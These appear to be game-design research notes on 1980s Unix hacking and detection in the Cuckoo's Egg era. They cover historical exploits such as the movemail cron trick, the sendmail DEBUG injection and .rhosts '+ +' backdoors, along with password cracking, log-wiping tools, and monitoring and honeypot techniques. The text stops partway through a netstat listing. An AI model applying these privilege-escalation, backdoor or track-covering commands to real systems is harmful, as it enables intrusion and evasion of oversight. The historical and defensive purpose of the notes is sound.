# 1980s Hacking Techniques, Exploits, and Detection Methods

Research compiled for gameplay mechanic design. Focuses on techniques from *The Cuckoo's Egg* era (1986-1989), 4.3 BSD Unix on VAX systems, and the broader 1980s hacking scene.

---

## 1. Unix Exploits of the Era

### GNU Emacs movemail Privilege Escalation

The exploit used by Markus Hess in *The Cuckoo's Egg* (1986). This is the central exploit for the game's narrative.

**How it worked:**

1. GNU Emacs shipped with a utility called `movemail` that moved mail from the system spool to a user's mailbox.
2. On 4.3 BSD, `movemail` was installed SUID root -- meaning it ran with root privileges regardless of who executed it.
3. The attacker used `movemail` to write arbitrary content to `/usr/lib/crontab.local`, which the system's `cron` daemon processed.
4. The injected crontab entry ran a command like:
   ```
   * * * * * cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh
   ```
5. Within one minute (the next cron cycle), a SUID root shell appeared at `/tmp/sh`.
6. A cleanup entry removed the evidence: `rm -f /usr/lib/crontab.local`.

**Gameplay potential:** The player could discover this by noticing unexpected entries in `crontab.local`, finding a SUID shell in `/tmp`, or seeing anomalous `cron` activity in process accounting logs.

**Example detection output:**
```
$ find / -perm -4000 -print
/bin/su
/bin/passwd
/bin/login
/etc/movemail
/tmp/sh          <-- SUSPICIOUS: SUID shell in /tmp
```

### SUID/SGID Bit Exploitation

SUID (Set User ID) programs ran with the file owner's privileges. On 4.3 BSD, many system utilities were SUID root unnecessarily.

**Common SUID attack patterns:**
- Find all SUID binaries: `find / -perm -4000 -print`
- Exploit any SUID program that could write files or spawn shells
- Create backdoor SUID shells for persistent access

**Gameplay potential:** Player runs `find / -perm -4000 -print` regularly and compares output against a known-good baseline. New SUID files indicate compromise.

### Password File Attacks (/etc/passwd)

On 4.3 BSD, `/etc/passwd` was world-readable by design. It contained username, hashed password, UID, GID, GECOS info, home directory, and shell -- all in plaintext colon-delimited format.

**The /etc/passwd format:**
```
root:3aG5f2dK1pMnE:0:0:Charlie Root:/root:/bin/csh
sventek:f1kJd9aPq2nRs:1001:100:Joe Sventek:/home/sventek:/bin/csh
guest::1002:100:Guest Account:/home/guest:/bin/csh
```

**The attack:**
1. Copy `/etc/passwd` to attacker's own machine (trivially, since it was world-readable).
2. Run a dictionary attack offline using tools like Crack (by Alec Muffett).
3. DES-based `crypt(3)` hashed passwords were limited to 8 characters.
4. The two-character salt produced only 4,096 possible hash variations per password.
5. Common passwords fell within hours; full dictionaries within days.

**Historical note:** In 2014, researchers cracked the actual passwords of Unix pioneers (Dennis Ritchie, Ken Thompson, Brian Kernighan) from a publicly available early BSD `/etc/passwd` file. Thompson's password ("p/q2-q4!" -- a chess notation) took the longest, requiring GPU brute-forcing.

**The fix (password shadowing):** SunOS introduced shadow passwords in the mid-1980s. The hashes moved to `/etc/shadow` (readable only by root), leaving an `x` placeholder in `/etc/passwd`. BSD 4.3 Reno adopted this in 1990 -- meaning during the Cuckoo's Egg era, shadow passwords were not yet standard on BSD.

**Gameplay potential:** Player might discover the hacker has copied `/etc/passwd` by checking `lastcomm` output for suspicious `cp` commands, or noticing network transfers of the file.

### .rhosts Trust Exploitation

The Berkeley r-commands (`rlogin`, `rsh`, `rcp`) used a trust-based authentication model. If a remote host appeared in `/etc/hosts.equiv` or a user's `~/.rhosts` file, connections were accepted without passwords.

**The .rhosts file format:**
```
trusted-host.berkeley.edu username
```

**Critical misconfiguration -- the wildcard:**
```
+ +
```
This meant "allow any user from any host" -- effectively an open door. Attackers who gained access to one machine could plant `.rhosts` files as backdoors:

```
$ echo "+ +" > ~/.rhosts
```

**The attack chain:**
1. Compromise one machine on a trusted network.
2. Scour `/etc/hosts.equiv` and users' `.rhosts` files for trust relationships.
3. Use `rlogin` or `rsh` to hop to trusted machines without passwords.
4. Repeat, building a chain of compromised hosts.

**Gameplay potential:** Player examines `.rhosts` files across systems, maps trust relationships, and discovers unauthorized entries. The hacker's lateral movement path becomes visible through trust chains.

### sendmail DEBUG Vulnerability

The sendmail `DEBUG` command (exploited by the Morris Worm in November 1988) allowed remote command execution via SMTP.

**The exploit:**
```
$ telnet target.host 25
220 target.host Sendmail 5.58 ready
DEBUG
200 Debug set
MAIL FROM: </dev/null>
RCPT TO: <"|/bin/sh -c 'cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh'">
DATA
.
QUIT
```

The `RCPT TO` field was piped through a shell, allowing arbitrary command execution. The attacker could inject a bootstrap program, compile it on the target, and use it to download and execute the full payload.

**Gameplay potential:** Player might see suspicious SMTP connections in network logs, or notice that sendmail is running in debug mode via `ps` output.

### fingerd Buffer Overflow

The `fingerd` daemon on 4.3 BSD used `gets()` to read network input into a 512-byte stack buffer with no bounds checking. The Morris Worm sent 536 bytes to overflow this buffer on VAX systems.

**The technical mechanism:**
1. `fingerd` called `gets(line)` where `line` was a 512-byte stack array.
2. Input exceeding 512 bytes overwrote the return address on the stack.
3. The overflow payload contained VAX machine code that executed `execve("/bin/sh", 0, 0)`.
4. The fix was trivial: change `gets(line)` to `fgets(line, sizeof(line), stdin)`.

**Gameplay potential:** Player might detect this by monitoring `fingerd` crashes in syslog, or noticing unusual `finger` requests in connection logs.

---

## 2. Network Protocols and Their Weaknesses

### Telnet (Port 23) -- Cleartext Everything

The primary remote login protocol. All data -- including passwords -- transmitted in cleartext.

```
$ telnet lbl-csam.arpa
Trying 128.3.254.19...
Connected to lbl-csam.arpa.
Escape character is '^]'.

4.3 BSD UNIX (lbl-csam)

login: sventek
Password:             <-- sent in cleartext across the network
Last login: Mon Aug 18 03:42:17 from tymnet-still
```

**Gameplay potential:** Any session observed crossing the network is fully readable. The player could set up monitoring to capture login credentials passing over the wire.

### FTP (Port 21) -- Cleartext Credentials

File Transfer Protocol sent usernames and passwords in plaintext `USER` and `PASS` commands.

```
$ ftp milnet-host.mil
Connected to milnet-host.mil.
220 milnet-host FTP server ready.
Name: anonymous
331 Guest login ok, send ident as password.
Password: hacker@somewhere
230 Guest login ok, access restrictions apply.
ftp> get /etc/passwd
```

**Gameplay potential:** The hacker uses FTP to exfiltrate `/etc/passwd` files. Player can detect this in connection logs.

### rlogin/rsh (Ports 513/514) -- Trust-Based Authentication

No encryption. Authentication based entirely on the source hostname and `.rhosts` / `hosts.equiv` files. Vulnerable to IP spoofing.

```
$ rlogin trusted-host.berkeley.edu
Last login: Tue Sep 2 14:22:33 from lbl-csam
Berkeley UNIX 4.3 (trusted-host) (ttyp0)
%
```

No password prompt if trust is configured. The attacker moves laterally without leaving authentication traces.

### X.25 Packet Switching Networks

X.25 was the backbone for long-distance data communication in the 1980s. Networks included:

- **Tymnet** (US) -- commercial packet-switching network, headquartered in Cupertino, CA
- **Datex-P** (West Germany) -- operated by Deutsche Bundespost, launched 1985
- **TRANSPAC** (France)
- **PSS** (UK)

**Hess's connection path:**
```
Hannover, Germany
  -> Datex-P (German X.25 network)
    -> Satellite link / transatlantic cable
      -> Tymnet International Gateway (US)
        -> MITRE Corporation (McLean, VA)
          -> Lawrence Berkeley Laboratory
            -> ARPANET / MILNET
              -> 400+ military computers
```

X.25 networks used Network User Addresses (NUAs) -- numeric addresses like phone numbers. Tracing a connection required cooperation from each network operator along the chain.

**Gameplay potential:** The multi-hop nature of X.25 connections is central to the tracing mechanic. Each hop requires contacting a different network operator, adding delay and bureaucratic obstacles.

### UUCP (Unix-to-Unix Copy)

Store-and-forward networking protocol. Systems dialed each other on schedules to exchange mail and files. Used "bang path" addressing:

```
host1!host2!host3!user
```

Each `!` represented a hop. Messages could take hours or days to traverse the chain.

**Gameplay potential:** UUCP paths could be used to trace message origins or detect data exfiltration routes.

### Finger Protocol (Port 79)

Revealed detailed user information without authentication:

```
$ finger @lbl-csam.arpa
[lbl-csam.arpa]
Login    Name              TTY  Idle   When         Office
stoll    Cliff Stoll       p0         Mon 09:14
sventek  Joe Sventek       p2   3d    Fri 14:22     <-- idle 3 days?
root     Charlie Root      co         Mon 06:00
```

```
$ finger sventek@lbl-csam.arpa
[lbl-csam.arpa]
Login: sventek                    Name: Joe Sventek
Directory: /home/sventek          Shell: /bin/csh
Last login Fri Aug 15 14:22 (PDT) on ttyp2 from tymnet-still
No Mail.
No Plan.
```

**Security issues:**
- Revealed who was logged in and from where
- Showed idle time (attacker knows which accounts are unattended)
- Showed login source (reveals trust relationships and network topology)
- Could enumerate all users on a system

**Gameplay potential:** The player uses `finger` defensively to monitor who's logged in. The hacker uses it offensively to find idle accounts and map the network. The `from tymnet-still` in the login source is a critical clue.

### SMTP Relaying (Port 25)

1980s sendmail accepted and relayed mail from anyone to anyone. No authentication, no origin verification. Mail headers were trivially forged.

**Gameplay potential:** The hacker could send commands or data through SMTP relays, and forged mail could be used for social engineering.

---

## 3. System Administration Tools for Detection

### Unix Accounting (acct/sa)

Process accounting recorded every command executed on the system. When enabled, the kernel wrote a record to `/var/adm/acct` (or `/var/adm/pacct`) upon each process termination.

**Enabling accounting:**
```
# /usr/etc/accton /var/adm/acct
```

**The `lastcomm` command -- recent commands by user:**
```
$ lastcomm sventek
cat        sventek  ttyp2     0.02 secs Mon Aug 18 03:44
ls         sventek  ttyp2     0.04 secs Mon Aug 18 03:44
cp         sventek  ttyp2     0.08 secs Mon Aug 18 03:45
emacs   S  sventek  ttyp2     1.24 secs Mon Aug 18 03:46
movemail S sventek  ttyp2     0.06 secs Mon Aug 18 03:46
sh       F root     __        0.02 secs Mon Aug 18 03:47
```

The `S` flag indicated a command ran with superuser privileges. The `F` flag indicated the process was run after a fork. A `movemail` with the `S` flag followed by a root shell is the telltale sign of the Emacs exploit.

**The `sa` command -- summary of accounting data:**
```
$ sa -u
root       0.01 cpu     0k  login
sventek    0.02 cpu     0k  cat
sventek    0.04 cpu     0k  ls
sventek    1.24 cpu     0k  emacs
sventek    0.06 cpu     0k  movemail
```

**Gameplay potential:** This is how the 75-cent discrepancy was discovered. The accounting system tracked CPU time per user, and an unregistered user consuming resources created the billing anomaly that started the investigation. `lastcomm` is a primary investigation tool.

### wtmp/utmp Logs

Binary log files tracking login sessions.

**utmp** (`/var/run/utmp`) -- current login sessions, read by `who`:
```
$ who
stoll    ttyp0    Aug 18 09:14 (lbl-csam)
sventek  ttyp2    Aug 18 03:42 (tymnet-still)
root     console  Aug 18 06:00
```

**wtmp** (`/var/adm/wtmp`) -- historical login/logout records, read by `last`:
```
$ last sventek
sventek  ttyp2  tymnet-still   Mon Aug 18 03:42 - 04:17 (00:35)
sventek  ttyp2  tymnet-still   Sat Aug 16 02:14 - 03:55 (01:41)
sventek  ttyp2  tymnet-still   Thu Aug 14 01:33 - 02:47 (01:14)
sventek  ttyp2  tymnet-still   Mon Aug 11 03:22 - 04:01 (00:39)
```

**Pattern recognition clues:**
- All logins come from `tymnet-still` (Tymnet switch) rather than local terminals
- Sessions occur in the early morning hours (US time) -- middle of the day in Germany
- The real Sventek hasn't used the account in months; someone else is using his credentials
- Login durations are consistent with someone browsing files and moving laterally

**lastlog** (`/var/adm/lastlog`) -- most recent login per user:
```
$ lastlog
Username    Port     From              Latest
root        console                    Mon Aug 18 06:00:17
stoll       ttyp0    lbl-csam          Mon Aug 18 09:14:33
sventek     ttyp2    tymnet-still      Mon Aug 18 03:42:08
```

**Gameplay potential:** The `last` command output is the player's timeline. Correlating login times with known legitimate user schedules reveals the impostor. The `from` field reveals the network path.

### syslog

BSD syslog daemon (`syslogd`) wrote messages from system services to log files. Appeared in 4.3 BSD.

**Configuration** (`/etc/syslog.conf`):
```
*.err;kern.debug;auth.notice      /var/log/messages
mail.info                         /var/log/maillog
auth.info                         /var/log/auth.log
*.emerg                           *
```

**Typical syslog output** (`/var/log/messages`):
```
Aug 18 03:42:08 lbl-csam login: LOGIN ON ttyp2 BY sventek FROM tymnet-still
Aug 18 03:46:12 lbl-csam su: BAD SU sventek to root on ttyp2
Aug 18 03:47:01 lbl-csam cron: (root) CMD (cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh)
Aug 18 04:17:33 lbl-csam login: LOGOUT ON ttyp2
```

**BSD syslog message format:**
```
<priority>Mmm dd hh:mm:ss hostname process: message
```

**Gameplay potential:** Syslog is the player's primary investigative log. Failed `su` attempts, suspicious cron activity, and authentication events are all recorded here. The player must configure syslog correctly and check it regularly.

### The `who` Command

Shows currently logged-in users:
```
$ who
stoll    ttyp0    Aug 18 09:14 (lbl-csam)
sventek  ttyp2    Aug 18 03:42 (tymnet-still)
```

### The `last` Command

Shows historical login records from wtmp:
```
$ last -20
stoll    ttyp0  lbl-csam    Mon Aug 18 09:14   still logged in
sventek  ttyp2  tymnet-still Mon Aug 18 03:42 - 04:17 (00:35)
root     console             Mon Aug 18 06:00   still logged in
reboot   ~                   Mon Aug 18 05:58
stoll    ttyp0  lbl-csam    Fri Aug 15 08:30 - 17:45 (09:15)
```

### Process Monitoring (`ps`)

On 4.3 BSD:
```
$ ps aux
USER       PID %CPU %MEM   SZ  RSS TT STAT  TIME COMMAND
root         1  0.0  0.2   44   96 co I     0:01 /etc/init
root         2  0.0  0.0    0    0 co D     0:00 pagedaemon
stoll     1847  0.4  1.2  192  480 p0 S     0:02 -csh
sventek   2031  2.1  0.8  148  320 p2 R     0:45 emacs
sventek   2033  0.0  0.2   44   80 p2 S     0:00 /bin/sh
root      2034  0.0  0.2   44   80 p2 I     0:00 /tmp/sh
```

**Suspicious indicators:**
- `sventek` running `emacs` with high CPU time
- A `/bin/sh` spawned from `sventek`'s session
- A root shell (`/tmp/sh`) spawned with no corresponding `su` or `login` entry

### Network Connections (`netstat`)

On 4.3 BSD:
```
$ netstat -a
Active Internet connections (including servers)
Proto  Recv-Q Send-Q  Local Address      Foreign Address     (state)
tcp         0      0  lbl-csam.telnet    tymnet-still.4523   ESTABLISHED
tcp         0      0  lbl-csam.smtp      *.smtp              LISTEN
tcp         0      0  lbl-csam.finger    *.*                 LISTEN
tcp         0      0  lbl-csam.ftp       *.*                 LISTEN
tcp         0      0  lbl-csam.telnet    *.*                 LISTEN
```

The `tymnet-still.4523` connection to the local `telnet` port shows an active Tymnet session -- the hacker's connection.

**Gameplay potential:** `netstat` lets the player see active connections in real-time. Combined with `who` and `ps`, the player can correlate a network connection to a user session to a running process.

### tcpdump (Born 1988)

Written by Van Jacobson, Sally Floyd, Vern Paxson, and Steven McCanne at Lawrence Berkeley Laboratory -- the same lab where Stoll worked. tcpdump appeared in 1988, slightly after the main Cuckoo's Egg timeline but within the era.

```
$ tcpdump -i en0 host tymnet-still
03:42:08.123456 tymnet-still.4523 > lbl-csam.telnet: P 1:44(43) ack 1 win 4096
03:42:08.234567 lbl-csam.telnet > tymnet-still.4523: P 1:23(22) ack 44 win 4096
```

**Gameplay potential:** Available as a late-game tool upgrade. Lets the player capture and examine network traffic directly.

### Connection Logging

Custom scripts could monitor connections. Stoll wrote programs that:
- Polled `who` output every 60 seconds
- Searched for specific usernames (the compromised account)
- Triggered alerts (beep, pager) when a match was found
- Logged all keystrokes from the monitored terminal

---

## 4. Phone Phreaking and Network Tracing

### How Phone Traces Worked in the 1980s

The 1980s were a transitional period for telephone switching:

**Mechanical/Electromechanical switches (pre-1980s):**
- Physical relays created circuit connections between caller and recipient
- To trace a call, technicians had to physically follow the wire connections through switch frames
- Each relay rack handled one digit of the phone number
- If the call ended before the trace completed, the circuit was released and the trace was lost
- Long-distance traces required sending technicians to each central office along the route
- This is why "keeping someone on the line" was genuinely necessary

**Electronic Switching Systems (1980s):**
- AT&T's #1 ESS (Electronic Switching System) was installed starting in 1965
- By the 1980s, most US switches were electronic
- Traces became database lookups -- essentially instant for domestic calls
- But international and packet-switched network traces still required manual cooperation

**The Cuckoo's Egg tracing challenge:**
The difficulty was not mechanical switching but multi-network jurisdiction:
1. The connection came in via Tymnet (a packet-switched network, not a phone call)
2. Tymnet could identify which incoming port the connection used
3. That port connected to an international X.25 gateway
4. The gateway connected to Datex-P in West Germany
5. Datex-P was operated by Deutsche Bundespost (the German postal authority)
6. Each organization had to be contacted separately and convinced to help
7. German privacy laws required a court order for the Bundespost to trace the call
8. The trace at each hop required the connection to be active

**Gameplay potential:** The tracing mechanic mirrors this multi-hop challenge. The player must keep the hacker online long enough for each network segment to complete its trace. Each segment requires contacting a different organization and possibly satisfying legal requirements.

### Tymnet and X.25 Networks

**Tymnet architecture:**
- Users dialed local phone numbers to reach Tymnet nodes
- Tymnet routed packets to destination hosts across its network
- Hosts connected to Tymnet appeared as network addresses (NUAs)
- International gateways connected Tymnet to foreign X.25 networks

**X.25 Network User Addresses (NUAs):**
```
NUA format: DNIC + National Number
Example:    3110 1234567890
            ^^^^-- Data Network Identification Code (country + network)
                 ^^^^^^^^^^-- subscriber number
```

**Key X.25 networks:**
| Network    | Country       | DNIC |
|-----------|---------------|------|
| Tymnet    | United States | 3106 |
| Telenet   | United States | 3110 |
| Datex-P   | West Germany  | 2624 |
| TRANSPAC  | France        | 2080 |
| PSS       | United Kingdom| 2342 |

**Gameplay potential:** The player sees X.25 NUAs in connection logs and must decode them to determine which country/network the connection originates from.

### International Call Routing

Hess's connection traversed:
1. Local phone line in Hannover to a Datex-P node
2. Datex-P X.25 virtual circuit to an international gateway
3. Satellite link or transatlantic cable to US
4. Tymnet international gateway receives the X.25 connection
5. Tymnet routes to LBL's Tymnet port
6. LBL's modem pool connects to the Unix systems

Each segment introduced latency. At 1200 baud (120 characters/second), keystrokes were noticeably delayed. Stoll could sometimes estimate the hacker's distance by the character echo delay.

### Phone Phreaking Context

While Hess used X.25 networks rather than phone phreaking per se, the phreaking scene was deeply intertwined with the hacker culture of the era.

**Blue Box** -- Generated multi-frequency (MF) tones to control long-distance switching. By the mid-1980s, out-of-band signaling (SS7) had largely killed blue boxing in the US and Western Europe. However, some international routes still used in-band signaling.

**Red Box** -- Emulated the coin-deposit tones of payphones, allowing free calls from phone booths. Used a modified crystal oscillator (6.5536 MHz instead of the standard 3.579545 MHz).

**Relevance to hacking:** Phreaking provided free or untraceable phone access to dial into computer systems and X.25 networks. The Chaos Computer Club (CCC) in Hamburg, with which Hess had connections, was deeply involved in both phreaking and hacking.

---

## 5. Honeypot and Trap Techniques

### Printer-Based Session Monitoring

Stoll's first monitoring setup was physical hardware:

1. Over a weekend, he "borrowed" 50 terminals and teleprinters from co-workers' desks.
2. He connected each to one of LBL's 50 incoming phone lines.
3. When the hacker dialed in, the teleprinter on that line printed every character in real-time.
4. After returning the borrowed equipment, he left one teleprinter permanently connected to the intrusion line.

The teletype printout served as a real-time audit log: timestamped, physical, and impossible for the hacker to tamper with (since it was a separate device). This was the 1986 equivalent of a network tap.

**Gameplay potential:** The player can "attach a printer" to a monitored line. This creates a session transcript that scrolls in a separate terminal pane, showing the hacker's keystrokes in real-time.

### The Alert System ("The Castle")

Stoll built a multi-layered monitoring system he called "the castle":

1. **Unix-8 as a monitoring station:** A separate machine connected to the LAN, hardened against attacks, used solely to watch the compromised systems (Unix-4 and Unix-5).

2. **Polling script:** A program (written in C and Fortran) that ran every 60 seconds:
   ```
   while true; do
       who_output=$(who)
       if echo "$who_output" | grep -q "sventek"; then
           echo "ALERT: sventek logged in at $(date)" >> /var/log/intrusion
           # Beep the terminal
           echo -e '\a'
           # Print all keystrokes
           script -a /var/log/sventek.session
       fi
       sleep 60
   done
   ```

3. **Pager integration:** Stoll rented a pocket pager ($20/month) and programmed the monitoring computer to dial it when the hacker logged in. This freed him from being physically at the lab 24/7.

**Gameplay potential:** The player builds increasingly sophisticated alert systems as the game progresses -- starting with manually checking `who`, then writing cron-based alerts, then adding pager notifications.

### Operation Showerhead -- The SDI Honeypot

The first documented honeypot sting operation:

1. Stoll noticed the hacker searched for keywords: `nuclear`, `NORAD`, `SDI`, `classified`.
2. He created a fictitious department at LBL tied to a fake SDI (Strategic Defense Initiative) contract.
3. The fake "SDInet" account contained:
   - Large files filled with impressive-sounding bureaucratic language about missile defense
   - Fake memos referencing fictional projects and contracts
   - Enough content to require hours of downloading at 1200 baud
4. The hacker took the bait, staying online for hours to download the fake documents.
5. This gave the Deutsche Bundespost enough time to complete their trace to Hannover.

**Gameplay potential:** The player crafts bait files with the right keywords, places them in monitored directories, and waits. The bait must be convincing enough (relevant keywords, realistic file sizes, plausible content) but also large enough to keep the hacker connected.

### Custom Alert Scripts

Practical monitoring scripts for 4.3 BSD:

**Watch for new connections:**
```sh
#!/bin/sh
# alert.sh - monitor for suspicious logins
WATCHUSER="sventek"
while true; do
    if who | grep -q "$WATCHUSER"; then
        echo "$(date): $WATCHUSER login detected" >> /var/log/watch.log
        echo -e '\a\a\a'  # triple beep
        # Log the session
        who | grep "$WATCHUSER" >> /var/log/watch.log
        netstat | grep ESTABLISHED >> /var/log/watch.log
    fi
    sleep 60
done
```

**Monitor for file access:**
```sh
#!/bin/sh
# tripwire.sh - watch for access to sensitive files
ls -la /etc/passwd > /tmp/baseline.$$
while true; do
    ls -la /etc/passwd > /tmp/current.$$
    if ! diff /tmp/baseline.$$ /tmp/current.$$ > /dev/null 2>&1; then
        echo "$(date): /etc/passwd modified!" >> /var/log/watch.log
    fi
    sleep 300
done
```

**Gameplay potential:** The player writes (or selects from templates) monitoring scripts. More sophisticated scripts catch more activity but consume system resources and may be noticed by the hacker.

### Monitored Directories and Trap Files

Beyond the SDI honeypot, detection relied on:

- **Canary files:** Files with enticing names (`passwords.txt`, `classified.doc`) placed in directories the hacker was likely to browse. If accessed, an alert fired.
- **Modified timestamps:** Checking `ls -la` on key system files to detect unauthorized modifications.
- **Tripwire directories:** Directories where any new file creation triggered an alert.

---

## 6. The Hacker's Toolkit

### What Markus Hess Used

Hess was not a sophisticated exploit developer. His approach was methodical and opportunistic:

**Initial access methods:**
- Default passwords (many military and research systems never changed factory defaults)
- The GNU Emacs movemail SUID exploit for privilege escalation
- Known vulnerabilities in common Unix utilities

**Lateral movement:**
1. Compromise one system (LBL via Tymnet)
2. Gain root access (movemail exploit)
3. Copy `/etc/passwd` for offline cracking
4. Read `/etc/hosts.equiv` and users' `~/.rhosts` to find trust relationships
5. Use `rlogin` / `rsh` to hop to trusted systems without passwords
6. Search each new system for network addresses, credentials, and further trust chains
7. Repeat -- Hess eventually accessed 400+ military computers this way

**Data exfiltration:**
- Searched for files containing keywords: `SDI`, `nuclear`, `NORAD`, `classified`, `secret`
- Used `grep` recursively to find relevant documents
- Downloaded files via the same Tymnet connection
- At 1200 baud, downloads were slow -- this became his vulnerability (kept him online long enough to trace)

**Commands the hacker would type:**
```
$ grep -rl "SDI" /usr/local /home /var/spool/mail
$ cat /etc/passwd
$ cat /etc/hosts.equiv
$ find /home -name ".rhosts" -print
$ rlogin milnet-host.army.mil
$ ls -la /usr/local/src/
$ cp /etc/passwd /tmp/.hidden
$ ftp remote-host
```

### Covering Tracks

Hess's track-covering was minimal (which is partly why Stoll caught him), but the standard techniques of the era included:

**Editing wtmp/utmp:**
- These are binary files, not editable with text editors
- Tools like ZAP zeroed out the attacker's login entry (but CERT released tools to detect zeroed entries)
- More sophisticated tools like CLOAK2 changed entries rather than zeroing them
- CLEAR deleted entries entirely, shifting remaining records

**Example of what a zeroed wtmp entry looks like (detected by forensics):**
```
$ last
stoll    ttyp0  lbl-csam    Mon Aug 18 09:14   still logged in
                                                               <-- gap/null entry
root     console             Mon Aug 18 06:00   still logged in
```

**Other track-covering:**
- Removing files from `/tmp` and shell history (`~/.history`, `~/.bash_history`)
- Clearing entries from `lastlog`
- Using intermediate hosts so logs show a hop rather than the true origin
- Operating during off-hours when administrators were less likely to be watching

**What Hess did NOT do well:**
- Did not consistently clean accounting logs (`acct`/`pacct`)
- Did not clean syslog entries
- Left the 75-cent accounting discrepancy that started the investigation
- Did not detect Stoll's monitoring setup
- Spent too long downloading the honeypot files

**Gameplay potential:** The player must check multiple log sources because the hacker may clean some but not others. Gaps in wtmp (detected by `last`) combined with entries still present in `acct` (detected by `lastcomm`) reveal the deception.

### Using Intermediate Hosts

Hess chained through multiple systems to obscure his origin:

```
Hannover -> Datex-P -> Tymnet -> MITRE -> LBL -> MILNET targets
```

Each intermediate host showed only the previous hop in its logs. From LBL's perspective, the connection came from Tymnet. From MILNET targets' perspective, it came from LBL. Tracing required following the chain backward through each system's logs.

---

## 7. Defense Tools Available

### TCP Wrappers (Wietse Venema, 1990)

Written by Wietse Venema at Eindhoven University of Technology in response to a Dutch hacker's intrusions. Published at the 3rd UNIX Security Symposium in Baltimore, September 1992.

**How it worked:**
- Replaced standard network daemons (started by `inetd`) with wrapper programs
- The wrapper checked access control lists before executing the real service
- All connection attempts were logged regardless of whether they were allowed

**Configuration files:**
- `/etc/hosts.allow` -- permitted connections
- `/etc/hosts.deny` -- denied connections

**Example `/etc/hosts.allow`:**
```
fingerd: LOCAL, .berkeley.edu
telnetd: LOCAL, .berkeley.edu, .lbl.gov
ftpd: ALL
```

**Example `/etc/hosts.deny`:**
```
ALL: ALL: (/usr/sbin/safe_finger -l @%h | mail -s "connection from %h" admin) &
```

The deny rule could trigger an alert -- including running `finger` back against the connecting host to identify the user.

**Security features:**
- Access control per host, domain, and/or service
- Detection of hostname spoofing (forward/reverse DNS mismatch)
- Booby traps (alert scripts triggered by denied connections)
- Logging of all connection attempts

**Gameplay potential:** TCP Wrappers is a mid-to-late-game defensive upgrade. The player configures allow/deny rules and gets alerts when unauthorized connection attempts occur. Note: historically available from 1990, so slightly after the core Cuckoo's Egg timeline (1986-1987), but within the broader 80s security era.

### Early IDS Concepts

Formal intrusion detection systems did not exist during the Cuckoo's Egg timeline. What existed were ad hoc approaches:

- **Manual log review** -- administrators reading syslog, wtmp, and accounting data
- **Custom scripts** -- like Stoll's monitoring programs
- **CERT/CC** -- established in 1988 after the Morris Worm, to coordinate incident response
- **Venema's monitoring tools** -- TCP Wrappers was essentially an early host-based IDS

The term "intrusion detection" was formalized by Dorothy Denning in her 1987 paper "An Intrusion-Detection Model," but practical IDS tools came later (1990s).

### Password Shadowing

**Before shadow passwords (4.3 BSD default):**
```
/etc/passwd (world-readable):
root:3aG5f2dK1pMnE:0:0:Charlie Root:/root:/bin/csh
```

**After shadow passwords:**
```
/etc/passwd (world-readable):
root:x:0:0:Charlie Root:/root:/bin/csh

/etc/shadow (root-readable only):
root:3aG5f2dK1pMnE:6445:0:99999:7:::
```

**Timeline:**
- SunOS: mid-1980s (first implementation)
- System V Release 3.2: 1988
- Julie Haugh's Shadow Password Suite: 1987
- BSD 4.3 Reno: 1990

During the Cuckoo's Egg era (1986-1987), shadow passwords were not standard on BSD systems.

### One-Time Passwords (S/Key)

Developed by Bellcore in the late 1980s. The user carried a printed list of passwords; each was valid for exactly one login. Even if intercepted, a used password was worthless.

**How S/Key worked:**
1. A secret passphrase was hashed N times (e.g., 100)
2. The server stored hash #100
3. For login #1, the user provided hash #99
4. The server hashed it once and compared with the stored #100
5. For login #2, the user provided hash #98
6. The server hashed it once and compared with the now-stored #99

**Gameplay potential:** S/Key could be a late-game security upgrade that blocks the hacker's password reuse.

### Kerberos (MIT Project Athena, 1988)

Developed at MIT as part of Project Athena to provide network authentication without sending passwords over the network.

**Core concepts:**
- Key Distribution Center (KDC) issues time-limited tickets
- Tickets prove identity without transmitting passwords
- Mutual authentication -- both client and server verify each other
- Tickets expire, limiting the window for replay attacks

**Version history:**
- Kerberos V4: 1988 (limited to MIT initially)
- Kerberos V5: 1993 (widely deployed)

During the Cuckoo's Egg era, Kerberos was still in development. Its absence meant all authentication relied on reusable passwords sent in cleartext.

---

## 8. Specific Commands and Their Output on 4.3 BSD

### System Information

```
$ uname -a
4.3 BSD UNIX #3: Sat Apr  5 15:22:59 PST 1986
    lbl-csam.arpa (VAX-11/750)

$ uptime
 9:14am  up 3 days, 3:16,  3 users,  load average: 0.42, 0.35, 0.28
```

### User Investigation Commands

```
$ who
stoll    ttyp0    Aug 18 09:14 (lbl-csam)
sventek  ttyp2    Aug 18 03:42 (tymnet-still)
root     console  Aug 18 06:00

$ w
 9:14am  up 3 days,  3 users,  load average: 0.42, 0.35, 0.28
User     tty       login@  idle   JCPU   PCPU  what
stoll    ttyp0     9:14am         0:02   0:01  w
sventek  ttyp2     3:42am         0:45   0:38  emacs
root     console   6:00am  3:14   0:00   0:00  -csh

$ finger sventek
Login: sventek                    Name: Joe Sventek
Directory: /home/sventek          Shell: /bin/csh
On since Aug 18 03:42 (PDT) on ttyp2 from tymnet-still
5 hours 32 minutes idle
No Mail.
No Plan.

$ last sventek
sventek  ttyp2  tymnet-still   Mon Aug 18 03:42   still logged in
sventek  ttyp2  tymnet-still   Sat Aug 16 02:14 - 03:55 (01:41)
sventek  ttyp2  tymnet-still   Thu Aug 14 01:33 - 02:47 (01:14)
sventek  ttyp2  tymnet-still   Mon Aug 11 03:22 - 04:01 (00:39)
sventek  ttyp2  tymnet-still   Fri Aug  8 02:55 - 03:33 (00:38)

$ lastlog
Username    Port     From              Latest
root        console                    Mon Aug 18 06:00:17
stoll       ttyp0    lbl-csam          Mon Aug 18 09:14:33
sventek     ttyp2    tymnet-still      Mon Aug 18 03:42:08
guest       ttyp3    ucb-arpa          Thu Jul 10 14:22:01
```

### Process and Network Commands

```
$ ps aux
USER       PID %CPU %MEM   SZ  RSS TT STAT  TIME COMMAND
root         1  0.0  0.2   44   96 co Is    0:01 /etc/init
root        38  0.0  0.1   16   48 co Is    0:00 /etc/cron
root        42  0.0  0.3   52  128 co Ss    0:12 /etc/syslogd
root        55  0.0  0.2   40   96 co Is    0:00 /etc/inetd
root        60  0.0  0.1   24   56 co Is    0:00 /usr/lib/sendmail -bd -q1h
stoll     1847  0.4  1.2  192  480 p0 Ss    0:02 -csh
stoll     2100  0.0  0.3   52  132 p0 R+    0:00 ps aux
sventek   2031  2.1  0.8  148  320 p2 S     0:45 emacs
sventek   2033  0.0  0.2   44   80 p2 S     0:00 /bin/sh

$ netstat -an
Active Internet connections (including servers)
